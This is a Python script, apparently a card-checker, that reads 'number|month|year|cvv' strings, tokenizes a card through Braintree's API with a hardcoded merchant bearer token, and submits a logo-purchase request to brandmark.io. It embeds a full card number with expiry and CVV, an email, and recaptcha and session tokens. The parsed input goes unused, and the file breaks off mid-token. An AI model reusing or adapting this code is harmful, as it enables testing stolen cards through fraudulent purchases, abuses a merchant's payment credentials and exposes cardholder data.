import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()

	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDQxNzAyOTIsImp0aSI6IjM5ZTE1OGYyLWQ3MTgtNGNhYy1iNzIzLWM4MWM3MGJmOTgzMCIsInN1YiI6ImZ6anc5bXIyd2RieXJ3YmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZ6anc5bXIyd2RieXJ3YmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.TtbLaUeUko0ROlOH6k2foOojQEsQRvndpTCsdfuVkevIyg3Me94uC_zAt9iZw61eXxNBGis0syqJKYGd9IcFPA',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '2f2a00f1-b797-4033-9556-0b8394508a14',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': '4033060022595737',
	                'expirationMonth': '11',
	                'expirationYear': '2027',
	                'cvv': '439',
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	import requests
	
	cookies = {
	    '_ga': 'GA1.2.1757683358.1703266782',
	    '_gid': 'GA1.2.509391131.1704081550',
	    '_ga_93VBC82KGM': 'GS1.2.1704081551.3.1.1704083885.0.0.0',
	}
	
	headers = {
	    'authority': 'app.brandmark.io',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5',
	    'content-type': 'application/json;charset=UTF-8',
	    # 'cookie': '_ga=GA1.2.1757683358.1703266782; _gid=GA1.2.509391131.1704081550; _ga_93VBC82KGM=GS1.2.1704081551.3.1.1704083885.0.0.0',
	    'origin': 'https://app.brandmark.io',
	    'referer': 'https://app.brandmark.io/v3/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'tier': 'basic',
	    'email': 'fcodzilla@gmail.com',
	    'payload': {
	        'nonce': tok,
	        'details': {
	            'expirationMonth': '11',
	            'expirationYear': '2027',
	            'bin': '403306',
	            'cardType': 'Visa',
	            'lastFour': '5737',
	            'lastTwo': '37',
	        },
	        'type': 'CreditCard',
	        'description': 'ending in 37',
	        'deviceData': '{"device_session_id":"278d54c93fdc045b87f842f39c372072","fraud_merchant_id":null,"correlation_id":"a5e7029e9a77bb7e73fb223b6d37c2c7"}',
	        'binData': {
	            'prepaid': 'No',
	            'healthcare': 'No',
	            'debit': 'Yes',
	            'durbinRegulated': 'No',
	            'commercial': 'Unknown',
	            'payroll': 'No',
	            'issuingBank': 'Axiom Bank',
	            'countryOfIssuance': 'USA',
	            'productId': 'F',
	        },
	    },
	    'discount': False,
	    'referral': None,
	    'params': {
	        'id': 'logo-5f92d1a2-1f83-4c0b-91a8-40eb87293d39',
	        'layout': 1,
	        'title': '.',
	        'titleFamily': 'Comfortaa Bold Alt1',
	        'titleVariant': '700',
	        'titleColor': [
	            {
	                'hex': '#fcfcfc',
	            },
	        ],
	        'titleScale': 3,
	        'titleLetterSpace': 0,
	        'titleLineSpace': 1.1,
	        'titleBoldness': 0,
	        'titleX': 0,
	        'titleY': 0,
	        'titleAlign': 'left',
	        'slogan': '',
	        'sloganFamily': 'Coustard',
	        'sloganVariant': '400',
	        'sloganColor': [
	            {
	                'hex': '#fcfcfc',
	            },
	        ],
	        'sloganScale': 3,
	        'sloganLetterSpace': 0,
	        'sloganLineSpace': 1.1,
	        'sloganBoldness': 0,
	        'sloganAlign': 'left',
	        'sloganX': 0,
	        'sloganY': 0,
	        'icon': {
	            'type': 'noun',
	            'id': '257437',
	            'preview': 'https://app.brandmark.io/nounpreview/257437.png',
	        },
	        'showIcon': True,
	        'iconScale': 1,
	        'iconColor': [
	            {
	                'hex': '#fcfcfc',
	            },
	        ],
	        'iconContainer': None,
	        'showIconContainer': False,
	        'iconContainerScale': 1,
	        'iconContainerColor': [
	            {
	                'hex': '#987ecc',
	            },
	        ],
	        'iconSpace': 1,
	        'iconX': 0,
	        'iconY': 0,
	        'nthChar': 0,
	        'container': None,
	        'showContainer': False,
	        'containerScale': 1,
	        'containerColor': [
	            {
	                'hex': '#987ecc',
	            },
	        ],
	        'containerX': 0,
	        'containerY': 0,
	        'backgroundColor': [
	            {
	                'hex': '#673fb5',
	            },
	        ],
	        'palette': [
	            '#673fb5',
	            '#fcfcfc',
	            '#e6e1f1',
	            '#d1c6e7',
	            '#bcabdd',
	        ],
	        'keywords': [
	            '.',
	        ],
	    },
	    'svg': '<!--?xml version="1.0" encoding="UTF-8" standalone="no"?-->\n<svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svg439953" viewBox="0 0 1024 768" height="768px" width="1024px" version="1.1">\n  <metadata id="metadata439959">\n    <rdf:rdf>\n      <cc:work rdf:about="">\n        <dc:format>image/svg+xml</dc:format>\n        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"></dc:type>\n      </cc:work>\n    </rdf:rdf>\n  </metadata>\n  <defs id="defs439957"></defs>\n  <linearGradient spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient2-logo-5f92d1a2-1f83-4c0b-91a8-40eb87293d39">\n    <stop id="stop439934" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop439936" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <linearGradient gradientTransform="rotate(-30)" spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient3-logo-5f92d1a2-1f83-4c0b-91a8-40eb87293d39">\n    <stop id="stop439939" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop439941" stop-opacity="1" stop-color="#cccccc" offset="50%"></stop>\n    <stop id="stop439943" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <g id="logo-group">\n    <image xlink:href="" id="container" x="272" y="144" width="480" height="480" transform="translate(0 0)" style="display: none;"></image>\n    <g id="logo-center" transform="translate(398.22101499999997 0)">\n      <image xlink:href="" id="icon_container" x="0" y="0" style="display: none;"></image>\n      <g id="slogan" style="font-style:normal;font-weight:400;font-size:32px;line-height:1;font-family:Coustard;font-variant-ligatures:none;text-align:center;text-anchor:middle" transform="translate(0 0)"></g>\n      <g id="title" style="font-style:normal;font-weight:700;font-size:72px;line-height:1;font-family:\'Comfortaa Bold Alt1\';font-variant-ligatures:none;text-align:center;text-anchor:middle" transform="translate(0 0)">\n        <path id="path439962" style="font-style:normal;font-weight:700;font-size:72px;line-height:1;font-family:\'Comfortaa Bold Alt1\';font-variant-ligatures:none;text-align:center;text-anchor:middle" d="m 515.44587,-7.344 c -1.008,-1.008 -2.15999,-1.512 -3.456,-1.512 -1.368,0 -2.52,0.504 -3.52799,1.512 -1.00801,1.008 -1.44,2.16 -1.44,3.528 0,1.368 0.43199,2.52 1.44,3.528 1.00799,1.008 2.15999,1.44 3.52799,1.44 1.36801,0 2.52,-0.432 3.528,-1.44 0.93601,-1.008 1.44,-2.16 1.44,-3.528 0,-1.368 -0.50399,-2.52 -1.512,-3.528 z" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#fcfcfc" stroke="#fcfcfc" transform="translate(0 336.7) translate(198.5 32.288000000000004) scale(3) translate(-507.02188 8.856)"></path>\n      </g>\n      <image xlink:href="data:image/png;base64,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" id="icon" x="0" y="309" width="150" height="150"></image>\n    </g>\n  </g>\n</svg>\n',
	    'recaptcha_token': '03AFcWeA6jFzel_oJ97qU0tLlllz6FUVBF0IeIKaHAzYSQ9b_xwKb7GwDqUuswOksauJ3eEbN4SYkJKJSZCDY7QVOSAeP3lszPHTrzkiRwxfB7twT2PuPsjSx_THAlThK9wFSoTOZvtpG_Qlu0pnqpF9ZtSB8DxjoMq1Jhu4E6E9nbDMHvIpWa4upTUyN3aSKtMaB6B4akoY3NotxRbxmm8jS_BvLdZ1isR-uImHLx4JT_M-5DCcPss923KyCIrpC_tWz_gdmGiFVS0zUtAuL3x6d8QUl8fDzylZrQM2tiLwaCcLanR46jtcmRDu0h12Kze-hLqhLG-h_gogTCJPB2WSUEdYomfowxeXKDJ0JQAcxQWzFXJon10GR4cyTlCCrUt2IAPVVEBvmu7Ys7151ZfkdJAjy6vCt9qXOsR76xUvf2ApJKGqVUCp-uxqmRDahsBVWSPosNir-1Cv5LoZbTN2QZmvZ8znJdb81Q_l_9AUtvEDJqxjvzCj7fN4gzhMOrGYdj1x1iduCAha-x_hTCJX7hFpM_L7szhRtdxe9XDbDKYG0s6fpcvmqZTSBVarSyV8hhALG-8OVoxcnRfUSa5ABOHZA-tN27r7wZVZ6i9w2hFkhs28zRAavdxS8ZlOP4RzU7bVLrgc-1ZgHLK4ZQuvfZI_UKgZX0hfPKw9Qj599YibHifwUlxanXZmuJ0Mz3MMOc4pnVacnfmjnGeYwlSqOUr-XgbhDfjc3dY0GpzCGTgtEKvE6hSp4ez6VhHZHi_pawntJTESLLMGoy3aTwuJ3aAewvGN0SaeJA0mQtfwKFhAsEM58fDdy4NupUjRcrKZ7UXmW4DBKSavZzb8vxN7ov5ld7o_vUy8R3JPlctR7PeGJ8AEU-I4Bu5Ipj1Cl1L0cfU735ytFXb35pnnMJGqJwsEbUF0xr9RpUPloDmiBWA40bQIA1lGg8gBGQumtHgvPP6yjnRah0lV1kfAhfiv4TbF_C6AOr1RoFk0KZ7BS-EwFWqXXV7SIWeGpSPBH8x-W_aBjEg-98jSGaa58CJhcigQRWf9wBUytMLIMVbx5R4DGX-jmdW6op-du9SR65ICow2eB82afE5HtG7Wbzwt1cxDEVIkYi-pXv-BUAN7tEN4u3mOZK8ztGHWI3Ey_lideWxPKE2e8g9XhDkSmoivKJVBZn4pGraRM_V-DJnzBGQQCGwseFgiSvx2PyKmK6c629qk66Vcuqshnu9MFaTiH6kG5LMv2Jp7Xla6CqZBLi1L67dt3gphFl5VuGqBYVfQVD_nMATAMhJ89M1hRr0GoQ0hXFaSGyEP3ARgZdEh8mfJSnhyxa42_rNX4EQ6bsdfs-Yaqu8tGJ-0fsfKhpAE_zTsPyPAvl1cbDiBOl1X7oQMCMrU9w652hVUsxXyzPtanvg3rOZjT570HMqJYR1uH3a-q8JyFCMW824WcRCTGzHJoAOxCEkBl39mSoia0_1aqrSCnf0MEoy59NAosEQOklB6AkJtE6D8h3N1YvS3Em9com88UNO6DMpXVVfj1HYyDdB50FJXxBQbiR235JEkJwDZSZkuoBDdPC__LZcJiBl8BSJ_EWg-w2SIGCq2V_Aal-EfrOPTbX',
	    'token': 'WJ/rOSRg1H9d3aEHyaHTCgRy8FsRTN+NnfBjTY+MnyW2HV6HTngdgck6CE7mFoQT84a7RbP59hCJO0n6q7b5Lsto9Z+ivRM3yIe1mqMXpRAwLsHrZKtYJMm9cMa5Qnv4331sJY8tDSxPsQevBxjLa5HpkdOFtZgRfH2c06ReJ8pqXFFOyegVvJ4uYeV3Asj44lQvaD3u1BCAHJDIDJFGEFIEJEXkJWwPQJS766tj6/MgQIvmIlgl2CZcCVMKBaXv8XHLS9CjftGzi9ryDIgnyGGgm6WSNhjENREx98j8zMp11g5kWArALQJabjkS4FFjAM0eSgVelrwRrS7eXYMpkfBYZlM8ApYTFyxxM71F50gTDYJ+RW0AhrtpvnxeF8TF51VAFMVIKNFWV0Yap06s5oYkd0DI5VMSHKuh2E6qKAfF5rd4EwqFm8SuH3eZ24ruR9rDPzQb2obYW1ixLMYSKPqwhQnmgLv1KOs8MfHDqWPlnIgrAfY0G0T7qVhuMnMihRzJseYfWqN2NTmSI0VvLP0luF4GTDKz6rnGGevqxZ0fR8OkxtJcKQcbft3zwC588cPbi3mgBlLG79T9ax2HQnZvN1LADX6UXMfhkNAb+AMpT+GhGRJU9Ommo+0SB8ONPjpQQyBWPOdELrq5FHIpD04aPis5nDLWyPemoUuTtYrgZJHl62FgMGR1ZiMOcNsooKtNm/GJEha8EQ7e0FqZF5TcQcwm4kRyvCw8yAH3IfcbrPPm1ddVKQzen08Hh8RP/OiOZgLP6CLP3fHqcDyuM+oJS0Ws5huiv3D7Yzwp79p/ReF53pZx7OFRh/U5iBjImpB+JGQi8V62yr7FDal3VqeFKXYAL10xodb2yXgkyrjqORZ5q6vbeD6OltEFeX8xwIKX2V8+1Uj6J9VTxB/vUJtE8HyuVVfku2oMXrwQdoCa41q5/dlDxNxYM3mg248I7d0tVRK5Jj2PiOkxOAS3RD5dDzN/sGfOmLBFeG/jqBG24XZFi1/fnNXc8xB/t3Ch8rerbjQd9Pia4E52lgj9Dg0WjfRxnHViYLy1qpFvoLzAwoOnRugBFv2RLkxwOtsTp/agvefVc+1tuEoRj4F9XNYHbayauy7SWVVjI0DqcscZQ4O9w8XraRFrAyCo0INQFu9DF5qRgK8OJhfh2+nfsPtUUEIesrCj7iVIYGndhYlo9rexrBVkEyrDkW9zVRDqlf9qzjBVKg7XhAF+1PmyN8NmD1xmmO1+ZqP8Da5dXfItPecXEcnIFYbBJ2nr8gERZeNeYuWizavL2Yn7UMh2oOdhcrgX3PiqrfZMkLjBVzdZTsXxIbUlgz9YKybVr+5SAOp6IqofYFgstAwQSLAcIYeQs3SIZExVZgwvJpGYcQXjnTLN3k/MZXx/